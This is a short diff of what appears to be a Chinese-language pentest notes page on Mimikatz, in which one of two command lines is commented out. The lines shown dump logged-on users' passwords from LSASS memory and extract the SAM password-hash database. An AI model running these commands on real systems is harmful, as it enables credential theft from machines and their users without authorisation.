@@ -29,7 +29,7 @@ https://github.com/gentilkiwi/mimikatz/releases
 
 ```ts
 mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" " exit"
-mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+// mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 ```
 
 **1x 版本:**
